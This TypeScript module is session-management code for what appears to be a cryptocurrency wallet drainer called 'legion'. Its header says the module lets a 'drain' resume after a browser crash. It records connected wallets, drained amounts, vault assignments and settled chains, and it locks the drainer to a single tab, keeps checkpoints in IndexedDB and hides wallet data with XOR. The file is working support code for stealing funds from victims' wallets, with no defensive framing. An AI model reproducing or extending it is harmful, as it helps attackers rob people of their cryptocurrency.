/**
 * PHASE 10: SESSION MANAGEMENT
 * Multi-tab prevention, state persistence, recovery checkpoints
 * Ensures drain can resume if browser closed/crashed mid-execution
 */

interface SessionCheckpoint {
  sessionId: string
  timestamp: number
  phase: string
  walletsConnected: Record<string, string>
  drainedAmounts: Record<string, number>
  vaultAssignments: Record<string, string>
  settledChains: string[]
  lastTxHash?: string
  errorCount: number
  encrypted: boolean
}

interface CacheEntry<T> {
  value: T
  expiresAt: number
}

// ─────────────────────────────────────────────────────────────────────────────
// SESSION MANAGER: Multi-tab Prevention & Locking
// ─────────────────────────────────────────────────────────────────────────────

export class SessionManager {
  private sessionId: string
  private broadcastChannel: BroadcastChannel | null = null
  private heartbeatInterval: NodeJS.Timeout | null = null
  private otherTabsDetected: Set<string> = new Set()
  private isSessionActive: boolean = true

  constructor() {
    this.sessionId = this.generateSessionId()
    this.initializeBroadcastChannel()
    this.startHeartbeat()
  }

  private generateSessionId(): string {
    return `legion-session-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`
  }

  private initializeBroadcastChannel(): void {
    try {
      this.broadcastChannel = new BroadcastChannel('legion-session-v2')

      this.broadcastChannel.onmessage = (event) => {
        const { type, sessionId, timestamp } = event.data

        if (type === 'PING') {
          // Another tab is checking if we're alive
          if (sessionId !== this.sessionId) {
            this.broadcastChannel?.postMessage({
              type: 'PONG',
              sessionId: this.sessionId,
              timestamp: Date.now(),
            })
          }
        } else if (type === 'PONG') {
          // Response from another tab
          if (sessionId !== this.sessionId) {
            this.otherTabsDetected.add(sessionId)
            console.warn(`[SESSION] Another tab detected: ${sessionId}`)
          }
        } else if (type === 'TERMINATE') {
          // Another tab wants us to close
          if (sessionId !== this.sessionId) {
            console.log('[SESSION] Received TERMINATE from another tab, closing...')
            this.terminateSession()
          }
        }
      }

      console.log(`[SESSION] BroadcastChannel initialized: ${this.sessionId}`)
    } catch (err) {
      console.warn('[SESSION] BroadcastChannel not available:', err)
      // Fallback: use localStorage for basic multi-tab detection
      this.initializeLocalStorageFallback()
    }
  }

  private initializeLocalStorageFallback(): void {
    try {
      const key = 'legion-session-active'
      const existingSession = localStorage.getItem(key)

      if (existingSession && existingSession !== this.sessionId) {
        console.warn('[SESSION] Another tab detected via localStorage')
        this.killOtherTab(existingSession)
      }

      localStorage.setItem(key, this.sessionId)
      localStorage.setItem('legion-session-timestamp', String(Date.now()))
    } catch (err) {
      console.warn('[SESSION] localStorage fallback failed:', err)
    }
  }

  private startHeartbeat(): void {
    this.heartbeatInterval = setInterval(() => {
      this.detectMultipleTabs()
    }, 5000) // Check every 5 seconds
  }

  async detectMultipleTabs(): Promise<boolean> {
    if (!this.broadcastChannel) {
      return false
    }

    this.otherTabsDetected.clear()

    // Broadcast PING to all tabs
    this.broadcastChannel.postMessage({
      type: 'PING',
      sessionId: this.sessionId,
      timestamp: Date.now(),
    })

    // Wait 500ms for responses
    await new Promise((resolve) => setTimeout(resolve, 500))

    if (this.otherTabsDetected.size > 0) {
      console.warn(`[SESSION] Detected ${this.otherTabsDetected.size} other tabs`)
      this.killOtherTabs()
      return true
    }

    return false
  }

  private killOtherTabs(): void {
    if (!this.broadcastChannel) return

    for (const sessionId of this.otherTabsDetected) {
      this.broadcastChannel.postMessage({
        type: 'TERMINATE',
        sessionId: this.sessionId,
        timestamp: Date.now(),
      })
      console.log(`[SESSION] Sent TERMINATE to ${sessionId}`)
    }
  }

  private killOtherTab(sessionId: string): void {
    if (!this.broadcastChannel) return

    this.broadcastChannel.postMessage({
      type: 'TERMINATE',
      sessionId: this.sessionId,
      timestamp: Date.now(),
    })
    console.log(`[SESSION] Sent TERMINATE to ${sessionId}`)
  }

  private terminateSession(): void {
    this.isSessionActive = false
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval)
    }
    if (this.broadcastChannel) {
      this.broadcastChannel.close()
    }

    // Close this tab after 2 seconds
    setTimeout(() => {
      window.close()
    }, 2000)
  }

  getSessionId(): string {
    return this.sessionId
  }

  isActive(): boolean {
    return this.isSessionActive
  }

  cleanup(): void {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval)
    }
    if (this.broadcastChannel) {
      this.broadcastChannel.close()
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// STATE MANAGER: Checkpoint Persistence & Recovery
// ─────────────────────────────────────────────────────────────────────────────

export class StateManager {
  private dbName = 'legion-execution-db'
  private storeName = 'checkpoints'
  private db: IDBDatabase | null = null
  private sessionId: string

  constructor(sessionId: string) {
    this.sessionId = sessionId
    this.initializeIndexedDB()
  }

  private async initializeIndexedDB(): Promise<void> {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, 1)

      request.onupgradeneeded = (event) => {
        const db = (event.target as IDBOpenDBRequest).result
        if (!db.objectStoreNames.contains(this.storeName)) {
          const store = db.createObjectStore(this.storeName, { keyPath: 'sessionId' })
          store.createIndex('timestamp', 'timestamp', { unique: false })
        }
      }

      request.onsuccess = () => {
        this.db = request.result
        console.log('[STATE] IndexedDB initialized')
        resolve()
      }

      request.onerror = () => {
        console.warn('[STATE] IndexedDB failed:', request.error)
        reject(request.error)
      }
    })
  }

  async saveCheckpoint(checkpoint: Omit<SessionCheckpoint, 'sessionId'>): Promise<boolean> {
    if (!this.db) return false

    return new Promise((resolve) => {
      const transaction = this.db!.transaction([this.storeName], 'readwrite')
      const store = transaction.objectStore(this.storeName)

      const dataToStore: SessionCheckpoint = {
        ...checkpoint,
        sessionId: this.sessionId,
      }

      // Encrypt sensitive data before storing
      dataToStore.walletsConnected = this.encryptData(dataToStore.walletsConnected)

      const request = store.put(dataToStore)

      request.onsuccess = () => {
        console.log('[STATE] Checkpoint saved at', new Date(checkpoint.timestamp).toISOString())
        resolve(true)
      }

      request.onerror = () => {
        console.warn('[STATE] Failed to save checkpoint:', request.error)
        resolve(false)
      }
    })
  }

  async loadLastCheckpoint(): Promise<SessionCheckpoint | null> {
    if (!this.db) return null

    return new Promise((resolve) => {
      const transaction = this.db!.transaction([this.storeName], 'readonly')
      const store = transaction.objectStore(this.storeName)
      const index = store.index('timestamp')

      // Get all checkpoints and find the most recent one
      const request = index.getAll()

      request.onsuccess = () => {
        const checkpoints = request.result as SessionCheckpoint[]

        if (checkpoints.length === 0) {
          console.log('[STATE] No checkpoints found')
          resolve(null)
          return
        }

        const sorted = checkpoints.sort((a, b) => b.timestamp - a.timestamp)
        const latest = sorted[0]

        // Verify checkpoint is fresh (< 1 hour old)
        const ageMinutes = (Date.now() - latest.timestamp) / (1000 * 60)
        if (ageMinutes > 60) {
          console.warn('[STATE] Checkpoint too old, skipping recovery')
          resolve(null)
          return
        }

        // Decrypt sensitive data
        if (latest.encrypted) {
          latest.walletsConnected = this.decryptData(latest.walletsConnected)
        }

        console.log('[STATE] Loaded checkpoint from', new Date(latest.timestamp).toISOString())
        resolve(latest)
      }

      request.onerror = () => {
        console.warn('[STATE] Failed to load checkpoint:', request.error)
        resolve(null)
      }
    })
  }

  async cleanupOldCheckpoints(): Promise<void> {
    if (!this.db) return

    return new Promise((resolve) => {
      const transaction = this.db!.transaction([this.storeName], 'readwrite')
      const store = transaction.objectStore(this.storeName)
      const index = store.index('timestamp')

      const request = index.getAll()

      request.onsuccess = () => {
        const checkpoints = request.result as SessionCheckpoint[]

        const now = Date.now()
        const oneDayMs = 24 * 60 * 60 * 1000

        for (const checkpoint of checkpoints) {
          if (now - checkpoint.timestamp > oneDayMs) {
            store.delete(checkpoint.sessionId)
          }
        }

        // Keep only latest 5 checkpoints per session
        const grouped: Record<string, SessionCheckpoint[]> = {}
        for (const checkpoint of checkpoints) {
          if (!grouped[checkpoint.sessionId]) {
            grouped[checkpoint.sessionId] = []
          }
          grouped[checkpoint.sessionId].push(checkpoint)
        }

        for (const sessionId in grouped) {
          const sorted = grouped[sessionId].sort((a, b) => b.timestamp - a.timestamp)
          for (let i = 5; i < sorted.length; i++) {
            store.delete(sorted[i].sessionId)
          }
        }

        console.log('[STATE] Cleanup complete')
        resolve()
      }

      request.onerror = () => {
        console.warn('[STATE] Cleanup failed:', request.error)
        resolve()
      }
    })
  }

  private encryptData(data: any): any {
    // Simple XOR encryption with session key (not cryptographically secure)
    // For production, use TweetNaCl or libsodium
    try {
      const json = JSON.stringify(data)
      const key = this.sessionId.split('').reduce((a, b) => a + b.charCodeAt(0), 0)
      const encrypted = json
        .split('')
        .map((char) => String.fromCharCode(char.charCodeAt(0) ^ (key % 256)))
        .join('')
      return btoa(encrypted) // Base64 encode
    } catch {
      return data // Fallback: return unencrypted
    }
  }

  private decryptData(data: any): any {
    try {
      const encoded = typeof data === 'string' ? data : JSON.stringify(data)
      const encrypted = atob(encoded) // Base64 decode
      const key = this.sessionId.split('').reduce((a, b) => a + b.charCodeAt(0), 0)
      const decrypted = encrypted
        .split('')
        .map((char) => String.fromCharCode(char.charCodeAt(0) ^ (key % 256)))
        .join('')
      return JSON.parse(decrypted)
    } catch {
      return data // Fallback: return as-is
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// CACHE MANAGER: Balance & Gas Price Caching
// ─────────────────────────────────────────────────────────────────────────────

export class CacheManager {
  private balanceCache: Map<string, CacheEntry<number>> = new Map()
  private gaspricCache: Map<string, CacheEntry<number>> = new Map()
  private balanceTtl = 5 * 60 * 1000 // 5 minutes
  private gaspriceTtl = 1 * 60 * 1000 // 1 minute

  cacheBalance(address: string, balance: number): void {
    this.balanceCache.set(address, {
      value: balance,
      expiresAt: Date.now() + this.balanceTtl,
    })
  }

  getBalance(address: string): number | null {
    const entry = this.balanceCache.get(address)
    if (!entry) return null
    if (Date.now() > entry.expiresAt) {
      this.balanceCache.delete(address)
      return null
    }
    return entry.value
  }

  cacheGasPrice(chain: string, gasPrice: number): void {
    this.gaspricCache.set(chain, {
      value: gasPrice,
      expiresAt: Date.now() + this.gaspriceTtl,
    })
  }

  getGasPrice(chain: string): number | null {
    const entry = this.gaspricCache.get(chain)
    if (!entry) return null
    if (Date.now() > entry.expiresAt) {
      this.gaspricCache.delete(chain)
      return null
    }
    return entry.value
  }

  invalidateBalance(address: string): void {
    this.balanceCache.delete(address)
  }

  invalidateGasPrice(chain: string): void {
    this.gaspricCache.delete(chain)
  }

  clearAll(): void {
    this.balanceCache.clear()
    this.gaspricCache.clear()
  }

  getStats(): { balances: number; gasprices: number } {
    return {
      balances: this.balanceCache.size,
      gasprices: this.gaspricCache.size,
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// EXECUTION CONTEXT: Main session lifecycle manager
// ─────────────────────────────────────────────────────────────────────────────

export class ExecutionContext {
  private sessionManager: SessionManager
  private stateManager: StateManager
  private cacheManager: CacheManager
  private currentCheckpoint: SessionCheckpoint | null = null

  constructor() {
    this.sessionManager = new SessionManager()
    this.stateManager = new StateManager(this.sessionManager.getSessionId())
    this.cacheManager = new CacheManager()
  }

  async initialize(): Promise<void> {
    console.log('[EXECUTION] Initializing execution context...')

    // Check for other tabs
    const multiTabDetected = await this.sessionManager.detectMultipleTabs()
    if (multiTabDetected) {
      console.error('[EXECUTION] Multiple tabs detected, terminating...')
      throw new Error('Multiple tabs detected')
    }

    // Try to resume from checkpoint
    const checkpoint = await this.stateManager.loadLastCheckpoint()
    if (checkpoint) {
      console.log('[EXECUTION] Resuming from checkpoint:', checkpoint.phase)
      this.currentCheckpoint = checkpoint
    }

    // Cleanup old checkpoints
    await this.stateManager.cleanupOldCheckpoints()

    console.log('[EXECUTION] Initialization complete')
  }

  async saveState(state: Omit<SessionCheckpoint, 'sessionId'>): Promise<void> {
    const success = await this.stateManager.saveCheckpoint(state)
    if (success) {
      this.currentCheckpoint = { ...state, sessionId: this.sessionManager.getSessionId() }
    }
  }

  getCurrentCheckpoint(): SessionCheckpoint | null {
    return this.currentCheckpoint
  }

  getSessionId(): string {
    return this.sessionManager.getSessionId()
  }

  getCache(): CacheManager {
    return this.cacheManager
  }

  async cleanup(): Promise<void> {
    console.log('[EXECUTION] Cleaning up...')
    this.sessionManager.cleanup()
    this.cacheManager.clearAll()
    console.log('[EXECUTION] Cleanup complete')
  }

  isSessionActive(): boolean {
    return this.sessionManager.isActive()
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// RECOVERY FLOW: Resume execution after crash/reload
// ─────────────────────────────────────────────────────────────────────────────

export async function resumeExecutionFromCheckpoint(): Promise<SessionCheckpoint | null> {
  console.log('[RECOVERY] Checking for resumable checkpoint...')

  const context = new ExecutionContext()
  await context.initialize()

  const checkpoint = context.getCurrentCheckpoint()
  if (!checkpoint) {
    console.log('[RECOVERY] No checkpoint to resume from')
    return null
  }

  console.log('[RECOVERY] Found checkpoint:', {
    phase: checkpoint.phase,
    age: Math.round((Date.now() - checkpoint.timestamp) / 1000) + 's',
    chains: checkpoint.settledChains.length,
  })

  return checkpoint
}

// ─────────────────────────────────────────────────────────────────────────────
// SINGLETON INSTANCE: Global execution context
// ─────────────────────────────────────────────────────────────────────────────

let globalContext: ExecutionContext | null = null

export async function getExecutionContext(): Promise<ExecutionContext> {
  if (!globalContext) {
    globalContext = new ExecutionContext()
    await globalContext.initialize()
  }
  return globalContext
}

export function resetExecutionContext(): void {
  globalContext = null
}
